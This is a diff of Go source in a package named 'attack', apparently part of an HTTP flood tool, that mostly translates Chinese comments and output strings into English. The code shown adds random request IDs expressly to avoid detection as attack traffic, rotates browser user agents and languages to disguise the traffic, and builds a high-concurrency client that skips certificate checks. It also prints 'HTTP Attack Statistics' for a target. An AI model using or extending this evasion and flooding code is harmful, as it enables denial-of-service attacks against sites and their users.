@@ -2,6 +2,7 @@
 package attack
 
 import (
+	"context"
 	"crypto/rand"
 	"crypto/tls"
 	"fmt"
@@ -10,29 +11,28 @@ import (
 	"net/http"
 	"sync/atomic"
 	"time"
-	"context"
 )
 
-// addHeaders 添加HTTP请求头 - 优化确保Header正确添加
+// addHeaders Adds HTTP request headers - Optimized to ensure headers are correctly added
 func (h *HTTP) addHeaders(req *http.Request) {
-	// 如果有自定义头部，优先使用自定义头部
+	// Use custom headers if available
 	if h.Header != nil && len(h.Header) > 0 {
 		for k, v := range h.Header {
-			// 设置头部
+			// Set headers
 			req.Header.Set(k, v)
 		}
-		// 添加随机ID，防止被识别为攻击流量
+		// Add a random ID to prevent detection as attack traffic
 		req.Header.Set("X-Request-ID", generateRandomID())
 		return
 	}
-	
-	// 否则使用默认请求头
+
+	// Otherwise, use default headers
 	for k, v := range GetDefaultHeaders() {
 		req.Header.Set(k, v)
 	}
 }
 
-// generateRandomID 生成随机ID，增加请求的随机性
+// generateRandomID Generates a random ID to increase request randomness
 func generateRandomID() string {
 	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	id := make([]byte, 16)
@@ -43,26 +43,26 @@ func generateRandomID() string {
 	return string(id)
 }
 
-// GetDefaultHeaders 获取默认的HTTP请求头
+// GetDefaultHeaders Retrieves default HTTP request headers
 func GetDefaultHeaders() map[string]string {
-	// 增加更多现代浏览器常用的请求头，使流量看起来更真实
+	// Add more commonly used headers to make traffic appear more realistic
 	return map[string]string{
-		"User-Agent":      GetRandomUserAgent(),
-		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		"Accept-Language": GetRandomLanguage(),
-		"Accept-Encoding": "gzip, deflate, br",
-		"Connection":      GetRandomConnection(),
-		"Cache-Control":   "no-cache",
-		"Pragma":          "no-cache",
-		"Sec-Fetch-Dest":  "document",
-		"Sec-Fetch-Mode":  "navigate",
-		"Sec-Fetch-Site":  "none",
-		"Sec-Fetch-User":  "?1",
+		"User-Agent":                GetRandomUserAgent(),
+		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+		"Accept-Language":           GetRandomLanguage(),
+		"Accept-Encoding":           "gzip, deflate, br",
+		"Connection":                GetRandomConnection(),
+		"Cache-Control":             "no-cache",
+		"Pragma":                    "no-cache",
+		"Sec-Fetch-Dest":            "document",
+		"Sec-Fetch-Mode":            "navigate",
+		"Sec-Fetch-Site":            "none",
+		"Sec-Fetch-User":            "?1",
 		"Upgrade-Insecure-Requests": "1",
 	}
 }
 
-// GetRandomConnection 随机返回连接类型
+// GetRandomConnection Randomly returns a connection type
 func GetRandomConnection() string {
 	connections := []string{
 		"keep-alive",
@@ -72,7 +72,7 @@ func GetRandomConnection() string {
 	return connections[idx.Int64()]
 }
 
-// GetRandomLanguage 获取随机语言设置
+// GetRandomLanguage Retrieves a random language setting
 func GetRandomLanguage() string {
 	languages := []string{
 		"en-US,en;q=0.9",
@@ -89,7 +89,7 @@ func GetRandomLanguage() string {
 	return languages[idx.Int64()]
 }
 
-// GetRandomUserAgent 获取随机用户代理 - 增加更多现代浏览器的UA
+// GetRandomUserAgent Retrieves a random user agent - Adds more modern browser UAs
 func GetRandomUserAgent() string {
 	userAgents := []string{
 		// Chrome
@@ -109,97 +109,97 @@ func GetRandomUserAgent() string {
 		"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
 	}
 
-	// 随机选择一个用户代理
+	// Randomly select a user agent
 	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
 	return userAgents[idx.Int64()]
 }
 
-// newClient 创建HTTP客户端 - 增加了连接池和更多配置选项
+// newClient Creates an HTTP client - Adds connection pooling and more configuration options
 func (h *HTTP) newClient() *http.Client {
-	// 创建自定义传输配置
+	// Create custom transport configuration
 	transport := &http.Transport{
 		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,            // 忽略SSL证书错误
-			MinVersion:         tls.VersionTLS12, // 使用安全的TLS版本
+			InsecureSkipVerify: true,             // Ignore SSL certificate errors
+			MinVersion:         tls.VersionTLS12, // Use secure TLS versions
 		},
 		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
 			dialer := &net.Dialer{
-				Timeout:   5 * time.Second,  // 连接超时
+				Timeout:   5 * time.Second,  // Connection timeout
 				KeepAlive: 30 * time.Second, // TCP keepalive
 			}
 			conn, err := dialer.DialContext(ctx, network, addr)
 			return conn, err
 		},
-		MaxIdleConns:          1000,              // 最大空闲连接数
-		MaxConnsPerHost:       100,               // 每个主机的最大连接数
-		MaxIdleConnsPerHost:   100,               // 每个主机的最大空闲连接数
-		IdleConnTimeout:       90 * time.Second,  // 空闲连接超时
-		TLSHandshakeTimeout:   10 * time.Second,  // TLS握手超时
-		ExpectContinueTimeout: 1 * time.Second,   // 100-continue超时
-		DisableCompression:    true,              // 禁用压缩，以便更快发送请求
-		DisableKeepAlives:     false,             // 启用KeepAlive
-		ForceAttemptHTTP2:     true,              // 尝试使用HTTP/2
+		MaxIdleConns:          1000,             // Maximum idle connections
+		MaxConnsPerHost:       100,              // Maximum connections per host
+		MaxIdleConnsPerHost:   100,              // Maximum idle connections per host
+		IdleConnTimeout:       90 * time.Second, // Idle connection timeout
+		TLSHandshakeTimeout:   10 * time.Second, // TLS handshake timeout
+		ExpectContinueTimeout: 1 * time.Second,  // 100-continue timeout
+		DisableCompression:    true,             // Disable compression for faster requests
+		DisableKeepAlives:     false,            // Enable KeepAlive
+		ForceAttemptHTTP2:     true,             // Attempt HTTP/2
 	}
 
 	return &http.Client{
 		Transport: transport,
-		Timeout:   30 * time.Second, // 整个请求的超时时间
+		Timeout:   30 * time.Second, // Overall request timeout
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse // 不跟随重定向
+			return http.ErrUseLastResponse // Do not follow redirects
 		},
 	}
 }
 
-// printSummary 打印攻击统计信息
+// printSummary Prints attack statistics
 func (h *HTTP) printSummary() {
 	endTime := time.Now()
 	duration := endTime.Sub(h.startTime)
 
-	// 计算每秒请求数
+	// Calculate requests per second
 	requestsPerSecond := float64(0)
 	if duration.Seconds() > 0 {
 		requestsPerSecond = float64(atomic.LoadInt64(&h.sentRequests)) / duration.Seconds()
 	}
 
-	// 计算成功率
+	// Calculate success rate
 	successRate := float64(0)
 	sentReqs := atomic.LoadInt64(&h.sentRequests)
 	if sentReqs > 0 {
 		successRate = float64(atomic.LoadInt64(&h.recvResponses)) / float64(sentReqs) * 100
 	}
 
-	fmt.Printf("\n=== HTTP攻击统计 ===\n")
-	fmt.Printf("开始时间: %s\n", h.startTime.Format("2006/01/02 15:04:05"))
-	fmt.Printf("结束时间: %s\n", endTime.Format("2006/01/02 15:04:05"))
-	fmt.Printf("攻击目标: %s\n", h.Target)
-	fmt.Printf("请求方法: %s\n", h.Method)
-	fmt.Printf("线程数量: %d\n", h.Threads)
-	fmt.Printf("发送请求: %d (%.2f 请求/秒)\n",
+	fmt.Printf("\n=== HTTP Attack Statistics ===\n")
+	fmt.Printf("Start Time: %s\n", h.startTime.Format("2006/01/02 15:04:05"))
+	fmt.Printf("End Time: %s\n", endTime.Format("2006/01/02 15:04:05"))
+	fmt.Printf("Target: %s\n", h.Target)
+	fmt.Printf("Request Method: %s\n", h.Method)
+	fmt.Printf("Threads: %d\n", h.Threads)
+	fmt.Printf("Requests Sent: %d (%.2f requests/sec)\n",
 		sentReqs,
 		requestsPerSecond)
-	fmt.Printf("接收响应: %d (成功率: %.2f%%)\n",
+	fmt.Printf("Responses Received: %d (Success Rate: %.2f%%)\n",
 		atomic.LoadInt64(&h.recvResponses),
 		successRate)
-	fmt.Printf("发送数据: %.2f MB, 接收数据: %.2f MB\n",
+	fmt.Printf("Data Sent: %.2f MB, Data Received: %.2f MB\n",
 		float64(atomic.LoadInt64(&h.sentBytes))/(1024*1024),
 		float64(atomic.LoadInt64(&h.recvBytes))/(1024*1024))
-	fmt.Printf("连接错误: %d\n",
+	fmt.Printf("Connection Errors: %d\n",
 		atomic.LoadInt64(&h.connErrors))
 	fmt.Printf("====================\n")
 }
 
-// estimateRequestSize 估算HTTP请求大小
+// estimateRequestSize Estimates the size of an HTTP request
 func estimateRequestSize(req *http.Request) int {
-	size := len(req.Method) + len(req.URL.Path) + len("HTTP/1.1") + 4 // 请求行
+	size := len(req.Method) + len(req.URL.Path) + len("HTTP/1.1") + 4 // Request line
 
-	// 头部
+	// Headers
 	for name, values := range req.Header {
 		for _, value := range values {
-			size += len(name) + len(value) + 4 // 包括冒号、空格和CRLF
+			size += len(name) + len(value) + 4 // Includes colon, space, and CRLF
 		}
 	}
 
-	size += 2 // 头部和主体之间的空行
+	size += 2 // Blank line between headers and body
 
 	return size
 }
